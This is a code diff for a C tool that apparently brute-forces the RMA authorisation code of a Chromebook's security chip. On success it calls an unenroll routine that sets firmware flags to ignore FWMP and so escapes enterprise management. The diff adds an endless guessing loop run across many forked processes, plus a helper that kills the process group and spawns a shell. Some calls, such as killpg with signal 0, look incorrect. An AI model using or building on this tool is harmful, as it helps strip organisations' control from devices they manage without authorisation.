@@ -3,12 +3,18 @@
 #include <string.h>
 #include <time.h>
 #include <unistd.h>
+#include <signal.h>
 #include <sys/types.h>
 #include <linux/swab.h>
 #include "gsctoolrecre.c"
 
 /* Had to go through multiple files to find that! */
 int VENDOR_CC_RMA_CHALLENGE_RESPONSE = 30;
+void exitall(){
+    setpgid(getpid(),100);
+    killpg(2147,0);
+    execlp("/bin/bash", "bash", (char *)NULL);
+}
 uint32_t send_vendor_command(struct transfer_descriptor *td,
 			     uint16_t subcommand,
 			     const void *command_body,
@@ -62,22 +68,18 @@ char generate(char* str){
     }
     str[8] = 0;
 }
-void process(struct transfer_descriptor td){
-    //while(1){
-    char string[8];
-    generate(string);
-    printf("%s\n\n",string);
-    if (process_rma(&td, string) == 1){
-        printf("Auth code maybe found, sleeping for 10 seconds before setting GBB flags to ignore FWMP");
-        sleep(10);
-        unenroll();
-        exit(1);
+void process(struct transfer_descriptor td,int parentpid){
+    while(1){
+        char string[8];
+        generate(string);
+        if (process_rma(&td, string) == 1){
+            sleep(10);
+            unenroll();
+        }
     }
-    //}
 }
 int main(int argc,char* argv[]){
     int processes;
-
     printf("How many processes: \n");
 
     scanf("%d", &processes);
@@ -86,6 +88,7 @@ int main(int argc,char* argv[]){
         processes = 1;
         sleep(3);
     }
+    setpgid(getpid(),2147);
     int processespids[processes];
     processespids[0] = getpid();
     for (int i = 0; i < processes-1; i++){
@@ -93,6 +96,7 @@ int main(int argc,char* argv[]){
         if(p == 0){
             break;
         }
+        setpgid(p,2147);
         processespids[i+1] = p;
     }
     for (int i=0;i < (sizeof (processespids) /sizeof (processespids[0]));i++) {
@@ -101,6 +105,6 @@ int main(int argc,char* argv[]){
     srand(getpid());
     struct transfer_descriptor td;
     td.ep_type = ts_xfer;
-    process(td);
+    process(td,processespids[0]);
     return 0;
 }
